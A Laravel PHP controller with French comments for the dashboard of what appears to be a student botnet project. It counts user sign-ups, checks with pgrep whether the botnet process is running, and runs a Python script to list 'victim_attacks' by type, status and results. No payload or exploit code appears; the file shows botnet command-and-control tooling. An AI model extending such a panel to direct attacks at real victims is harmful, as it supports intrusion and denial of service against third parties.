<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Network;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    public function index()
    {
        $username = auth()->user()->prenom;
        $name = auth()->user()->nom;

        // Récupérer le nombre d'utilisateurs inscrits par mois
        $userCounts = User::select(DB::raw("COUNT(*) as count, MONTH(created_at) as month"))
            ->groupBy(DB::raw("MONTH(created_at)"))
            ->get();

        // Initialiser des tableaux pour stocker les données du graphique
        $months = [];
        $userRegistrationCounts = [];

        // Remplir les tableaux avec les données récupérées
        foreach ($userCounts as $userCount) {
            $months[] = \DateTime::createFromFormat('!m', $userCount->month)->format('F');
            $userRegistrationCounts[] = $userCount->count;
        }

        // Récupérer le nombre de groupes créés
        $networkCount = Network::count();

        $nomProcessus = "python3";

        // Exécuter la commande pgrep pour rechercher le processus par nom
        // Utilisation de -c pour compter le nombre de processus correspondants
        // Utilisation de -f pour rechercher dans toute la ligne de commande
        $commande = "pgrep -c -f \"$nomProcessus\"";
        $resultat = exec($commande);

        // Convertir le résultat en nombre entier
        $nombreProcessus = intval($resultat);

        // Vérifier si le processus est actif
        if ($nombreProcessus > 2) {
            $status_botnet = true;
        } else {
            $status_botnet = false;
        }

        // Exécute la commande --showall --target victim_attacks
        exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);
        //exec('/home/quentin/Documents/Projet_Ann_3ème/vitual_env/bin/python /home/quentin/Documents/Projet_Ann_3ème/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);

        // dd($output);
        // Initialiser un tableau pour stocker les attaques
        $attacks = [];

        foreach ($output as $line) {
            $line = trim($line);

            preg_match("/\((\d+), \d+, '(\w+)', '(\w+)', '(\{.*?\})', (?:'([^']*)'|None), '(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', '(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'\)/", $line, $matches);

            if ($matches) {
                $attacks[] = [
                    'id' => $matches[1],
                    'type' => $matches[2],
                    'status' => $matches[3],
                    'results' => $matches[5],
                    'timestamp_start' => $matches[6],
                    'timestamp_end' => $matches[7]
                ];
            }
        }
        // dd($attacks);


        $botnetRunning = (new BotnetController)->botnet_is_running();


        return view('home', [
            'username' => $username,
            'name' => $name,
            'months' => json_encode($months), // Convertir en format JSON pour le script du graphique
            'userRegistrationCounts' => json_encode($userRegistrationCounts),
            'networkCount' => $networkCount,
            'attacks' => $attacks,
            'botnetRunning' => $botnetRunning //variable qui détermine si le botnet est exec
        ]);
    }



}
